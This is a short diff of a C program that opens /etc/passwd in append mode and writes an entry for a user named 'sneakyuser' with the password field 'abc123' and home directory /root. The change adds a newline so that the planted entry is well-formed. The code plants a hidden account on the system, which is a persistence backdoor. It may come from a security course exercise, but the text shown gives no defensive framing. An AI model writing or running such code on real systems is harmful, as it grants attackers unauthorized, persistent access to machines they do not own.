@@ -16,7 +16,7 @@ int main() {
 
     // Append line
     FILE * passwordFile = fopen("/etc/passwd", "a");
-    fprintf(passwordFile, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+    fprintf(passwordFile, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
     fclose(passwordFile);
     printf("Appended line to password file\n");
 
